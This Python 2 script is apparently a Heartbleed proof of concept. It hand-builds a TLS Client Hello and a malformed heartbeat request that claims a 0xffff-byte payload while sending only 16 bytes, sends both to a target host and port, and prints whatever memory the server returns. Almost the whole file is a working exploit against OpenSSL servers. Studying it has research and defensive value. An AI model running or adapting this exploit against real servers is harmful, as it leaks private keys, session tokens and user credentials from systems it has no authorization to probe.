__author__ = 'Qubo'

import socket
import ssl
import time
import struct
import os


content_type = 22  #Content Type #22 means TLS handshake
content_version = '0301'.decode('hex')  #version: TLS 1.0

handshake_type = 1  #Client Hello
handshake_version = '0301'.decode('hex')

gmt_unix_time = time.time()
random_bytes = str(bytearray(os.urandom(28)))
Random = struct.pack('i28s', gmt_unix_time, random_bytes)

session_id_length = 0 # No session ID. I assume server will just generate a new session in this case.

cipher_suites  = 'c02b'.decode('hex')  #Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256 (0xc02b)
cipher_suites += 'c02f'.decode('hex')  #Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 (0xc02f)
cipher_suites += '009e'.decode('hex')  #Cipher Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 (0x009e)
cipher_suites += '009c'.decode('hex')  #Cipher Suite: TLS_RSA_WITH_AES_128_GCM_SHA256 (0x009c)
cipher_suites += 'c00a'.decode('hex')  #Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA (0xc00a)
cipher_suites += 'c014'.decode('hex')  #Cipher Suite: TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA (0xc014)
cipher_suites += '0039'.decode('hex')  #Cipher Suite: TLS_DHE_RSA_WITH_AES_256_CBC_SHA (0x0039)
cipher_suites += '0035'.decode('hex')  #Cipher Suite: TLS_RSA_WITH_AES_256_CBC_SHA (0x0035)
cipher_suites += 'c007'.decode('hex')  #Cipher Suite: TLS_ECDHE_ECDSA_WITH_RC4_128_SHA (0xc007)
cipher_suites += 'c009'.decode('hex')  #Cipher Suite: TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA (0xc009)
cipher_suites += 'c011'.decode('hex')  #Cipher Suite: TLS_ECDHE_RSA_WITH_RC4_128_SHA (0xc011)
cipher_suites += 'c013'.decode('hex')  #Cipher Suite: TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA (0xc013)
cipher_suites += '0033'.decode('hex')  #Cipher Suite: TLS_DHE_RSA_WITH_AES_128_CBC_SHA (0x0033)
cipher_suites += '0032'.decode('hex')  #Cipher Suite: TLS_DHE_DSS_WITH_AES_128_CBC_SHA (0x0032)
cipher_suites += '0005'.decode('hex')  #Cipher Suite: TLS_RSA_WITH_RC4_128_SHA (0x0005)
cipher_suites += '0004'.decode('hex')  #Cipher Suite: TLS_RSA_WITH_RC4_128_MD5 (0x0004)
cipher_suites += '002f'.decode('hex')  #Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA (0x002f)
cipher_suites += '000a'.decode('hex')  #Cipher Suite: TLS_RSA_WITH_3DES_EDE_CBC_SHA (0x000a)
cipher_suites_length = len(cipher_suites)

compression_methods = '00'.decode('hex')
compression_methods_length = len(compression_methods)

handshake_length  = len(handshake_version)     #size of handshake_version in Hello diagram
handshake_length += len(Random)                #length of Random bytes (including GTM UNIX TIMESTAMP)
handshake_length += 1                          #size of session_id_length in Hello diagram
handshake_length += session_id_length          #length of session ID
handshake_length += 2                          #size of cipher_suites_length in Hello diagram
handshake_length += cipher_suites_length       #length of Cipher Suites
handshake_length += 1                          #size of compression_methods_length in Hello diagram
handshake_length += compression_methods_length #length of Compression Methods

content_length  = 1                            #size of handshake_type in Hello diagram
content_length += 3                            #size of handshake_length in Hello diagram
content_length += handshake_length             #length of handshake diagram


# Start constructing the Client Hello diagram.
hello  = struct.pack('b', content_type)
hello += struct.pack('2s', content_version)
hello += struct.pack('>H', content_length)
hello += struct.pack('b', handshake_type)
hello += struct.pack('3s', hex(handshake_length).replace('0x','').zfill(6).decode('hex'))  #a bit tricky here, the size of handshake_length in Hello diagram is 3 bytes, not able to pack using short ('h') or int ('i') directly.
hello += struct.pack('2s', handshake_version)
hello += struct.pack('32s', Random)
hello += struct.pack('b', session_id_length)
hello += struct.pack('>H', cipher_suites_length)
hello += struct.pack(str(cipher_suites_length) + 's', cipher_suites)
hello += struct.pack('b', compression_methods_length)
hello += struct.pack('s', compression_methods)








content_type = 24 # Content Type #24 means Heartbeat protocol
content_version = '0301'.decode('hex')
heartbeat_type = 1 # Heartbeat Type #1 means Heartbeat request
heartbeat_content_length = int('0xffff', 0) # Heartbeat length. Essence of the Heartbleed vulnerability.
heartbeat_sequence = 0 #
heartbeat_content = str(bytearray(os.urandom(16)))
heartbeat_padding_length = 16
heartbeat_padding = str(bytearray(os.urandom(heartbeat_padding_length)))
content_length = 3 + 18 + 16 # 3 + heartbeat_content_length + heartbeat_padding_length

heartbeat  = struct.pack('b', content_type)
heartbeat += struct.pack('2s', content_version)
heartbeat += struct.pack('>H', content_length)
heartbeat += struct.pack('b', heartbeat_type)
heartbeat += struct.pack('>H', heartbeat_content_length)
#heartbeat += struct.pack(str(heartbeat_content_length) + 's', heartbeat_content)
heartbeat += struct.pack('>H', heartbeat_sequence)
heartbeat += struct.pack('16s', heartbeat_content)
heartbeat += struct.pack(str(heartbeat_padding_length) + 's', heartbeat_padding)

address = '127.0.0.1' #Hostname/IP address of the target server
port = 443 #Port of the target server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

ssl_sock = ssl.wrap_socket(s)

s.connect((address, port))
# ssl_sock.connect((address, port))

print ('===================== CONNECT ======================')
print (address + ':' + str(port) + ' connected...\n')

print ('===================== HELLO ========================')

s.send(hello)
print ('TLS Client Hello sent, waiting Server Hello done...')

# Retrieving Server Hello reply.
# Server Hello reply may contain multiple Record Layer diagrams...
# We need to retrieve them 1 by 1.

record_layer_header_length = 5 # sizeof(content_type) + sizeof(content_version) + sizeof(content_length) = 1 + 2 + 2

while 1:
    data = s.recv(record_layer_header_length)
    content_type, data = struct.unpack('B4s', data)
    content_version, content_length = struct.unpack('>2sH', data)
    data = s.recv(content_length)
    if data[0].encode('hex') == '0e':
        print('TLS Server Hello done...\n')
        break


print ('===================== HEARTBEAT ========================')

#print heartbeat

s.send(heartbeat)
print ('TLS client Heartbeat sent...')

print('TLS Server Heartbeat Reply:')
while 1:
    data = s.recv(1024)
    if data != '':
        print data
    else:
        print ('nothing...')
        break

s.close()